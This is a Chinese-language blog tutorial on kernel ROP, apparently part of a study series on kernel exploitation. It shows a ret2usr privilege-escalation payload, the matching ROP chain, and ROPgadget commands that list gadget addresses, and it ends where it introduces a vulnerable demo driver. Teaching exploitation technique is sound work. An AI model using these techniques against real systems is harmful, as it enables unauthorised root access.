---
layout: post
title: kernelrop的完整流程
excerpt: "kernel pwn"
categories: [知识总结]
comments: true
---
kernel rop 可以用来绕过SEMP

在传统的ret2usr中,内核流直接在用户空间运行如下代码进行权限提升
```
void __attribute__((regparm(3))) payload() {
        commit_creds(prepare_kernel_cred(0);
}
```
kernel rop链因该是如下样子
```
pop %rdi;ret
null
addr of prepare_kernel_cred()
mov %rax,%rdi;ret		#这个是rax复制到rdi
addr of commit_creds()
...
```
在64位机器中rdi是第一个参数,前三行代表了`prepare_kernel_cred(0)`,后两行代表了`commit_creds`

#### Gadgets
`/boot/vmlinuz`是压缩后的镜像,可用`extract-vmlinux`来解压

我们可以使用ropgadget来寻找gadget片段
```
vnik@ubuntu:~/ROPgadget$ ./ROPgadget.py --binary ./vmlinux > ~/ropgadget 
vnik@ubuntu:~/ROPgadget$ tail ~/ropgadget 
```
现在我们就可以搜索想要的片段了
```
vnik@ubuntu:~$ grep  ': pop rdi ; ret' ropgadget  
0xffffffff810c9ebd : pop rdi ; ret                <--- our first gadget
0xffffffff819b4827 : pop rdi ; ret 0x10b4
0xffffffff819c5f80 : pop rdi ; ret 0x161
0xffffffff819a08f2 : pop rdi ; ret 0x2eb4
0xffffffff8184806c : pop rdi ; ret 0x40a3
0xffffffff81a23854 : pop rdi ; ret 0x5b4
0xffffffff81952077 : pop rdi ; ret 0x6576
...
```
#### Vulnerable Driver
为了演示,我们需要一个有漏洞的驱动(https://github.com/vnik5287/kernel_rop)
